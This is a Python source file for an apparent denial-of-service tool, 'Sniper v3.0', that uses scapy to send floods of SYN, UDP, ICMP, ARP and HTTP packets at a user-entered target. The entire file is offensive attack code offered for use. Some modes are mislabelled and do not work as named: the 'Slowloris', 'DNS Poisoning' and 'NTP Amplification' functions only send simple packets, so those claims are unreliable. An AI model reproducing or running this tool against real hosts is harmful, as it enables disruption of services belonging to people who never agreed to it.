import os
import sys
import socket
from scapy.all import *
from urllib.parse import urlparse
from colorama import Fore, Style, init
import time

init()

ascii_art = """
\033[91m
   _____       _
  / ____|     (_)
 | (___  _ __  _ _ __   ___ _ __
  \___ \| '_ \| | '_ \ / _ \ '__|
  ____) | | | | | |_) |  __/ |
 |_____/|_| |_|_| .__/ \___|_|
      v3.0      | |
                |_| by JRDP Team  https://github.com/JRDPCN
\033[0m
"""

def blink_sniper():
    for _ in range(3):
        os.system('clear')
        print("\033[91m")
        print(ascii_art)
        time.sleep(0.5)
        os.system('clear')
        print("\033[0m")
        time.sleep(0.5)

def get_target_ip(target_url):
    try:
        parsed_url = urlparse(target_url)
        if parsed_url.scheme:
            target_ip = socket.gethostbyname(parsed_url.netloc)
        else:
            target_ip = socket.gethostbyname(target_url)
        return target_ip
    except socket.gaierror:
        print(f"\033[91mError: Unable to resolve host {target_url}\033[0m")
        sys.exit(1)

def send_http_get_packet(target_ip, port, num_packets):
    try:
        http_request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
        for i in range(num_packets):
            packet = IP(dst=target_ip)/TCP(dport=port, sport=RandShort())/Raw(load=http_request.encode())
            send(packet, verbose=0)
            print(f"\033[94mHTTP GET packet {i+1}/{num_packets} sent to {target_ip} \033[0m\033[92mSUCCESS\033[0m")
    except Exception as e:
        print(f"An error occurred: {e}")

def send_dns_request_packet(target_ip, port, num_packets, domain):
    try:
        for i in range(num_packets):
            packet = IP(dst=target_ip)/UDP(dport=port)/DNS(rd=1, qd=DNSQR(qname=domain))
            send(packet, verbose=0)
            print(f"\033[94mDNS Request packet {i+1}/{num_packets} sent to {target_ip} for domain {domain} \033[0m\033[92mSUCCESS\033[0m")
    except Exception as e:
        print(f"An error occurred: {e}")

def send_arp_request_packet(target_ip, num_packets):
    try:
        for i in range(num_packets):
            packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target_ip)
            sendp(packet, verbose=0)
            print(f"\033[94mARP Request packet {i+1}/{num_packets} sent to {target_ip} \033[0m\033[92mSUCCESS\033[0m")
    except Exception as e:
        print(f"An error occurred: {e}")

def send_syn_flood_packet(target_ip, port, num_packets):
    try:
        for i in range(num_packets):
            packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
            send(packet, verbose=0)
            print(f"\033[94mSYN Flood packet {i+1}/{num_packets} sent to {target_ip} \033[0m\033[92mSUCCESS\033[0m")
    except Exception as e:
        print(f"An error occurred: {e}")

def send_http_post_packet(target_ip, port, num_packets):
    try:
        http_post_request = f"POST / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
        for i in range(num_packets):
            packet = IP(dst=target_ip)/TCP(dport=port, sport=RandShort())/Raw(load=http_post_request.encode())
            send(packet, verbose=0)
            print(f"\033[94mHTTP POST packet {i+1}/{num_packets} sent to {target_ip} \033[0m\033[92mSUCCESS\033[0m")
    except Exception as e:
        print(f"An error occurred: {e}")

def send_icmp_echo_request_packet(target_ip, num_packets):
    try:
        for i in range(num_packets):
            packet = IP(dst=target_ip)/ICMP()
            send(packet, verbose=0)
            print(f"\033[94mICMP Echo Request packet {i+1}/{num_packets} sent to {target_ip} \033[0m\033[92mSUCCESS\033[0m")
    except Exception as e:
        print(f"An error occurred: {e}")

def send_udp_flood_packet(target_ip, port, num_packets, udp_message):
    try:
        for i in range(num_packets):
            packet = IP(dst=target_ip)/UDP(dport=port, sport=RandShort())/Raw(load=udp_message.encode())
            send(packet, verbose=0)
            print(f"\033[94mUDP Flood packet {i+1}/{num_packets} sent to {target_ip} with UDP message: {udp_message} on port {port} \033[0m\033[92mSUCCESS\033[0m")
    except Exception as e:
        print(f"An error occurred: {e}")

def slowloris_attack(target_ip, num_connections, port, num_packets):
    try:
        for _ in range(int(num_connections)):
            for i in range(num_packets):
                packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
                send(packet, verbose=0)
                print(f"\033[94mConnection established to {target_ip} \033[0m\033[92mSUCCESS\033[0m")
    except Exception as e:
        print(f"An error occurred: {e}")

def ntp_amplification_attack(target_ip, port, num_packets):
    try:
        for i in range(num_packets):
            packet = IP(dst=target_ip)/UDP(dport=port)/NTP()
            send(packet, verbose=0)
            print(f"\033[94mNTP Amplification packet {i+1}/{num_packets} sent to {target_ip} \033[0m\033[92mSUCCESS\033[0m")
    except Exception as e:
        print(f"An error occurred: {e}")

def dns_poisoning_attack(target_ip, num_packets, domain_to_poison, port):
    try:
        for i in range(num_packets):
            packet = IP(dst=target_ip)/UDP(dport=port)/DNS(rd=1, qd=DNSQR(qname=domain_to_poison))
            send(packet, verbose=0)
            print(f"\033[94mDNS Poisoning packet {i+1}/{num_packets} sent to {target_ip} for domain {domain_to_poison} \033[0m\033[92mSUCCESS\033[0m")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    if not 'SUDO_UID' in os.environ.keys():
        print(f"{Fore.RED}[!] Try executing Sniper as root.{Style.RESET_ALL}")
        exit()

    os.system('clear')
    blink_sniper()
    print(ascii_art)
    target_url = input("\033[95mEnter URL or IP: \033[0m")

    print("\033[94m1. HTTP GET\n2. DNS Request\n3. ARP Request\n4. SYN Flood\n5. HTTP POST\n6. ICMP Echo Request\n7. UDP Flood\n8. Slowloris Attack\n9. DNS Poisoning Attack\n10. NTP Amplification Attack\033[0m")
    packet_type = int(input("\033[95mSelect packet type: \033[0m"))

    num_packets = int(input("\033[95mEnter amount of packets: \033[0m"))

    target_ip = get_target_ip(target_url)
    
    if packet_type == 1:
        port = int(input("\033[95mEnter port: \033[0m"))
        send_http_get_packet(target_ip, port, num_packets)
    elif packet_type == 2:
        port = int(input("\033[95mEnter port: \033[0m"))
        domain = input("\033[95mEnter domain: \033[0m")
        send_dns_request_packet(target_ip, port, num_packets, domain)
    elif packet_type == 3:
        send_arp_request_packet(target_ip, num_packets)
    elif packet_type == 4:
        port = int(input("\033[95mEnter port: \033[0m"))
        send_syn_flood_packet(target_ip, port, num_packets)
    elif packet_type == 5:
        port = int(input("\033[95mEnter port: \033[0m"))
        send_http_post_packet(target_ip, port, num_packets)
    elif packet_type == 6:
        send_icmp_echo_request_packet(target_ip, num_packets)
    elif packet_type == 7:
        port = int(input("\033[95mEnter port: \033[0m"))
        udp_message = input("\033[95mEnter UDP message: \033[0m")
        send_udp_flood_packet(target_ip, port, num_packets, udp_message)
    elif packet_type == 8:
        num_connections = input("\033[95mEnter number of connections for Slowloris Attack: \033[0m")
        port = int(input("\033[95mEnter port: \033[0m"))
        slowloris_attack(target_ip, num_connections, port, num_packets)
    elif packet_type == 9:
        domain_to_poison = input("\033[95mEnter the domain to poison: \033[0m")
        port = int(input("\033[95mEnter port: \033[0m"))
        dns_poisoning_attack(target_ip, num_packets, domain_to_poison, port)
    elif packet_type == 10:
        port = int(input("\033[95mEnter port: \033[0m"))
        ntp_amplification_attack(target_ip, port, num_packets)
    else:
        print(f"\033[91mInvalid packet type: {packet_type}\033[0m")
